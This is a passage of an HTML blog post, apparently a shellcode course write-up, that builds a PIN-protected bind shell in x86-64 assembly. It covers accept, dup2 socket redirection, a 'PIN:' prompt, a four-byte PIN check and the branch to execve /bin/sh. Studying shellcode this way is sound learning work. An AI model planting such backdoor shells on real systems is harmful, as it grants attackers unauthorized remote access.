+&lt;p&gt;In order to accept an incoming TCP connection we use the &lt;code class=&quot;highlighter-rouge&quot;&gt;accept()&lt;/code&gt; syscall which has 3 arguments. We already have sockfd previously set to RDI so let’s see the other 2 - &lt;code class=&quot;highlighter-rouge&quot;&gt;struct sockaddr *addr&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;socklen_t&lt;/code&gt;, and &lt;code class=&quot;highlighter-rouge&quot;&gt;int flags&lt;/code&gt;. The argument addr is a pointer to a sockaddr structure which we talked about earlier and know is 16 bytes in length. This is the reason we need to allocate 16 bytes on the stack as you see in the assembly code example below. Having allocated the space on the stack, we can also appoint the current RSP to RSI as it is pointing to the start of that struct. Next we can also use stack for storing the struct length in bytes, which we then read to RDX as 3rd argument value.&lt;/p&gt;
+
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;accept&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;accept&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sockfd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sockaddr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;socklen_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addrlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+	&lt;span class=&quot;nx&quot;&gt;sub&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsp&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;sub&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsp&lt;/span&gt;
+
+	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;al&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;43&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;syscall&lt;/span&gt;
+
+	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;r9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt; 	     &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;lets&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;keep&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;the&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fd&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;r9&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;later&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;use&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Once &lt;code class=&quot;highlighter-rouge&quot;&gt;accept()&lt;/code&gt; returns successfully we receive a new file descriptor for the accepted socket (saved in &lt;code class=&quot;highlighter-rouge&quot;&gt;r9&lt;/code&gt;) and can close the old one by using the &lt;code class=&quot;highlighter-rouge&quot;&gt;close()&lt;/code&gt; syscall. It takes only 1 parameter which is the old file descriptor &lt;code class=&quot;highlighter-rouge&quot;&gt;sockfd&lt;/code&gt; (already in RDI). So we can just set RAX to 3 which is the respective syscall number for &lt;code class=&quot;highlighter-rouge&quot;&gt;close()&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x3&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;syscall&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;dup2-syscall&quot;&gt;&lt;b&gt;dup2() syscall&lt;/b&gt;&lt;/h4&gt;
+
+&lt;p&gt;Once we accepted an incoming connection successfully, we received a new file descriptor. At this point we need to think ahead a bit. What we want our program to do is to write a message for the connected client to enter a PIN code and then receive the PIN code from the client as input. For this we can use &lt;code class=&quot;highlighter-rouge&quot;&gt;dup2()&lt;/code&gt; to tie the standard file descriptors (0-stdin, 1-stdout, 2-stderr) to the new socket so we can do the reading and writing easily. &lt;code class=&quot;highlighter-rouge&quot;&gt;dup2()&lt;/code&gt; takes 2 arguments, 1st the current file descriptor and 2nd the new file descriptor which creates a copy of the old one.&lt;/p&gt;
+
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;duplicate_sockets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;dup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;old&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;r9&lt;/span&gt;		&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;r9&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;holds&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;the&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fd&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;we&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;received&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;accept&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsi&lt;/span&gt;    &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stdin&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;al&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;33&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;syscall&lt;/span&gt;
+
+	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;      &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stdout&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;al&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;33&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;syscall&lt;/span&gt;
+
+	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;      &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stderr&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;al&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;33&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;syscall&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;correct-pin-code-before-executing-binsh&quot;&gt;&lt;b&gt;Correct PIN code before executing &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt;&lt;/b&gt;&lt;/h4&gt;
+
+&lt;p&gt;Now we have reached to the point where we have successfully established a connection between the server and the client. Next we will focus on the &lt;code class=&quot;highlighter-rouge&quot;&gt;read()&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;write()&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;execve()&lt;/code&gt; syscalls + the comparison of user usbmitted PIN with our secret PIN, to complete the assignment.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/SLAE/client_server.png&quot; alt=&quot;hello&quot; /&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;write-and-read-syscalls&quot;&gt;&lt;b&gt;write() and read() syscalls&lt;/b&gt;&lt;/h4&gt;
+
+&lt;p&gt;Write() syscall takes 3 arguments: &lt;b&gt;fd&lt;/b&gt; which is the new file descriptor we received from the accept() syscall, a &lt;b&gt;buf&lt;/b&gt; to hold to contents users writes and the &lt;b&gt;count&lt;/b&gt; to represent the number of bytes to be written.&lt;/p&gt;
+
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;ssize_t&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So in assembly we will use RDX register to specify that we want to write total of 6 bytes of data. Next on we zero out the contents of RSI registry and move the value &lt;code class=&quot;highlighter-rouge&quot;&gt;0x3a4e4950&lt;/code&gt; to it. This hex value presents a string “PIN:”. To get the exact form in hex, one could use a oneliner in python &lt;code class=&quot;highlighter-rouge&quot;&gt;python -c &quot;import binascii; inhex=binascii.hexlify('PIN:'[::-1]); print inhex&quot;&lt;/code&gt;, which also takes into account the little-endian format. After moving it to RSI, we push it on the stack so we can have the address on which we have stored the string in RSI instead of the value itself as we are dealing with a pointer.&lt;/p&gt;
+
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+
+	&lt;span class=&quot;nx&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdx&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x6&lt;/span&gt;
+
+	&lt;span class=&quot;nx&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsi&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsi&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x3a4e4950&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsi&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsp&lt;/span&gt;
+
+	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;syscall&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;For the &lt;code class=&quot;highlighter-rouge&quot;&gt;read()&lt;/code&gt; syscall we again have the correct fd in RDI already. This time we will be using RSI to hold the address value of the buffer where we will store the value submitted by the client. The number of bytes to be read is specified in RDX. As we are expecting a 4 digit PIN we will need to allocate a 4 byte long buffer (&lt;code class=&quot;highlighter-rouge&quot;&gt;sub rsp,4&lt;/code&gt;) and adjust the stack pointer to point to the beginning of the buffer (&lt;code class=&quot;highlighter-rouge&quot;&gt;mov rsi, rsp&lt;/code&gt;). Next we specify with &lt;code class=&quot;highlighter-rouge&quot;&gt;add rdx, 0x4&lt;/code&gt; that we want 4 bytes of data to be read and not more.&lt;/p&gt;
+
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ssize_t&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;sub&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsp&lt;/span&gt;
+
+	&lt;span class=&quot;nx&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdx&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x4&lt;/span&gt;
+
+	&lt;span class=&quot;nx&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;syscall&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;desicion-making-time&quot;&gt;&lt;b&gt;Desicion making time&lt;/b&gt;&lt;/h4&gt;
+
+&lt;p&gt;So we have told the client that we expect a PIN code, and we have received and read 4 bytes of data as PIN code. How do we decide if we will execute the &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt; or not? At this point we know that user input sits on the top of our stack at where RSP points to, so what we can do is check byte by byte whether these bytes correspond to what we are expecting them to. That is what’s happening at each &lt;code class=&quot;highlighter-rouge&quot;&gt;mov bl, byte [rsp+...]&lt;/code&gt;. We take 1 byte of data, compare it with the hex value. If they are equal we continue and take the next byte, same comparison follows. If, however, the 2 bytes do not equal we immediately jump the the exit and end the program.&lt;/p&gt;
+
+&lt;p&gt;As we are doing the last, 4th comparison and the bytes are equal (we have correct PIN), the jump will be made to &lt;code class=&quot;highlighter-rouge&quot;&gt;execve()&lt;/code&gt; instead of &lt;code class=&quot;highlighter-rouge&quot;&gt;exit()&lt;/code&gt;. Let’s see how do we implement the &lt;code class=&quot;highlighter-rouge&quot;&gt;execve()&lt;/code&gt; syscall in order to have shell back.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/SLAE/desicion.png&quot; alt=&quot;desicion&quot; /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;cmpinput&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rbx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rbx&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;bl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rcx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rcx&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rcx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x31&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;cmp&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rbx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rcx&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;jne&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;exit&lt;/span&gt;
+
+	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;bl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rcx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x32&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;cmp&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rbx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rcx&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;jne&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;exit&lt;/span&gt;
+
+	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;bl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rcx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x33&lt;/span&gt;
+        &lt;span class=&quot;nx&quot;&gt;cmp&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rbx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rcx&lt;/span&gt;
+        &lt;span class=&quot;nx&quot;&gt;jne&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;exit&lt;/span&gt;
+
+	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;bl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rcx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x34&lt;/span&gt;
+        &lt;span class=&quot;nx&quot;&gt;cmp&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rbx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rcx&lt;/span&gt;
+        &lt;span class=&quot;nx&quot;&gt;je&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;execve&lt;/span&gt;
+
+&lt;span class=&quot;nx&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;						&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;jump&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;here&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;bytes&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;match&lt;/span&gt;
+        &lt;span class=&quot;nx&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdi&lt;/span&gt;
+        &lt;span class=&quot;nx&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;
+        &lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;60&lt;/span&gt;
+        &lt;span class=&quot;nx&quot;&gt;syscall&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
